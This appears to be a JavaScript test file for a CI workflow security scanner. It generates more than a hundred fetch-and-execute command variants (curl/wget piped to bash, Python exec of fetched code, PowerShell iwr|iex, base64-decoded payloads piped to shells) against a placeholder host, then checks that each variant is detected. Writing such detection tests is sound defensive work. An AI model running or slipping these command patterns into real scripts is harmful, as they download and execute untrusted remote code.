'use strict';
// Deterministic metamorphic/adversarial corpus. Never execute input strings.
const test=require('node:test'),assert=require('node:assert/strict');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const PATH='.github/workflows/metamorphic.yml',URL='https://example.invalid/p';
function workflow(script){
 return ['on: issues','permissions: read-all','jobs:','  scan:',
 '    runs-on: ubuntu-latest','    steps:','      - run: |',
 ...script.split('\n').map(x=>'          '+x)].join('\n')+'\n';
}
const mutants=[
 ['LF',s=>s],
 ['CRLF',s=>s.replace(/\n/g,'\r\n')],
 ['BOM',s=>'\uFEFF'+s],
 ['quoted-on',s=>s.replace(/^on:/,"'on':")],
 ['comment-prefixed',s=>'# harmless metadata\n'+s],
 ['quoted-jobs',s=>s.replace(/^jobs:/m,'"jobs":')]
];
const cases=[];
function attack(family,rule,source){cases.push({family,rule,source});}
for(const [out,invoked] of [
 ['run.sh','./run.sh'],['./run.sh','run.sh'],
 ['scripts/run.sh','scripts/run.sh'],['/tmp/run.sh','/tmp/run.sh']
]){
 for(const [down,opt] of [['curl -fsSL','-o'],['wget -q','-O']]){
  for(const separator of ['\n',' && ',' ; ']){
   for(const interpreter of ['bash','sh']){
    attack('relative-download','REMOTE_DOWNLOADED_FILE_EXECUTION',
     down+' '+URL+' '+opt+' '+out+separator+interpreter+' '+invoked);
   }
  }
 }
}
for(const language of ['python','python3']){
 for(const delimiter of ['PY','DATA','END']){
  for(const method of ['urllib','requests']){
   for(const spacer of ['','\n# comment\n']){
    const fetch=method==='urllib'?'import urllib.request\nexec(urllib.request.urlopen(u).read())':
     'import requests\nexec(requests.get(u).text)';
    attack('multiline-interpreter','REMOTE_INTERPRETER_FETCH_EXECUTION',
     language+" - <<'"+delimiter+"'\nu='"+URL+"'"+spacer+'\n'+fetch+'\n'+delimiter);
   }
  }
 }
}
for(const shell of ['pwsh','powershell']){
 for(const fetch of ['iwr','irm','Invoke-WebRequest','Invoke-RestMethod']){
  for(const sink of ['iex','Invoke-Expression']){
   attack('powershell-aliases','REMOTE_POWERSHELL_EXECUTION',
    shell+' -Command "'+fetch+' '+URL+' | '+sink+'"');
  }
 }
}
for(const cmd of ['printf %s','echo']){
 for(const decoder of ['-d','--decode']){
  for(const target of ['bash','sh','python']){
   attack('decoded-interpreter','REMOTE_ENCODED_EVAL',
    cmd+" 'YWJjZA==' | base64 "+decoder+' | '+target);
  }
 }
}
for(const prefix of ['npx --package ','npx --package=','npm exec --package ','npm exec --package=']){
 for(const tag of ['latest','next','beta','main']){
  for(const name of ['demo','@example/demo']){
   attack('mutable-selection','MUTABLE_PACKAGE_EXECUTION',
    prefix+name+'@'+tag+' -- demo');
  }
 }
}
test('metamorphic corpus is large, diverse and deterministic',()=>{
 assert.ok(cases.length>=120,'Need independently chosen constructions');
 assert.equal(new Set(cases.map(x=>x.family)).size,5);
 assert.equal(mutants.length,6);
});
for(const [family,rule] of [
 ['relative-download','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['multiline-interpreter','REMOTE_INTERPRETER_FETCH_EXECUTION'],
 ['powershell-aliases','REMOTE_POWERSHELL_EXECUTION'],
 ['decoded-interpreter','REMOTE_ENCODED_EVAL'],
 ['mutable-selection','MUTABLE_PACKAGE_EXECUTION']
]){
 test('property: '+family+' must detect every constructed variant under all YAML mutations',()=>{
  const rows=cases.filter(x=>x.family===family),errors=[];
  for(const c of rows){
   const direct=findingsForScript(c.source);
   if(!direct.includes(rule)){errors.push({stage:'scanner',source:c.source});continue;}
   for(const [label,mutate] of mutants){
    const actual=inspectWorkflow(mutate(workflow(c.source)),{path:PATH});
    if(!actual.findings.some(f=>f.rule===rule&&f.severity==='HIGH')){
     errors.push({stage:label,source:c.source,status:actual.status,rules:actual.findings.map(f=>f.rule)});
    }
   }
  }
  assert.equal(errors.length,0,JSON.stringify({family,count:rows.length,errors:errors.slice(0,15)}));
 });
}
